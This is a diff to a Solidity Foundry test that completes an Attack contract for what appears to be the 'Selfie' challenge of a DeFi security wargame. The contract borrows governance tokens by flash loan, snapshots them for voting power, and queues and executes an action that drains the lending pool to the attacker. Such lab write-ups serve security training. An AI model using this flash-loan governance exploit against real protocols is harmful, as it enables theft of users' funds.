@@ -15,7 +15,7 @@ contract ProofsOfConcept is Test {
 
     Deployer _deployer;
 
-    ERC20Snapshot private _token;
+    DamnValuableTokenSnapshot private _token;
     SimpleGovernance private _gov;
     SelfiePool private _pool;
 
@@ -36,7 +36,7 @@ contract ProofsOfConcept is Test {
         assertEq(_token.balanceOf(address(_pool)), tokensInPool);
 
         vm.startPrank(_attacker);
-        Attack attack = new Attack();
+        Attack attack = new Attack(_token, _gov, _pool);
         attack.attack(tokensInPool);
 
         assertEq(_token.balanceOf(_attacker), tokensInPool);
@@ -50,20 +50,24 @@ contract Deployer {
 
     function deploy()
         external
-        returns (ERC20Snapshot token, SimpleGovernance gov, SelfiePool pool)
+        returns (
+            DamnValuableTokenSnapshot token,
+            SimpleGovernance gov,
+            SelfiePool pool
+        )
     {
         token = new DamnValuableTokenSnapshot(INITIAL_SUPPLY);
 
         gov = new SimpleGovernance(address(token));
         pool = new SelfiePool(address(token), address(gov));
-
         token.transfer(address(pool), TOKENS_IN_POOL);
+        token.snapshot();
     }
 }
 
 contract LoanUser {
-    ERC20Snapshot _token;
-    SelfiePool _pool;
+    ERC20Snapshot private _token;
+    SelfiePool private _pool;
 
     constructor(ERC20Snapshot token, SelfiePool pool) {
         _token = token;
@@ -92,19 +96,43 @@ contract LoanUser {
     }
 }
 
-contract Attack {
+contract Attack is Test {
     address _owner;
+    DamnValuableTokenSnapshot private _token;
+    SelfiePool private _pool;
+    SimpleGovernance private _gov;
 
-    constructor() {
+    constructor(
+        DamnValuableTokenSnapshot token,
+        SimpleGovernance gov,
+        SelfiePool pool
+    ) {
         _owner = msg.sender;
+
+        _token = token;
+        _gov = gov;
+        _pool = pool;
     }
 
     function attack(uint256 amount) external {
         require(msg.sender == _owner, "Only _owner can call");
 
-        // get loan
-        // use loan to queue drain funds
-        // return funds
-        // drain funds
+        _pool.flashLoan(amount);
+
+        vm.warp(2 days + 1 seconds);
+        _gov.executeAction(1);
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        _token.snapshot();
+        _token.getBalanceAtLastSnapshot(address(this));
+
+        _gov.queueAction(
+            address(_pool),
+            abi.encodeWithSignature("drainAllFunds(address)", _owner),
+            0
+        );
+
+        ERC20Snapshot(token).transfer(address(_pool), amount);
     }
 }
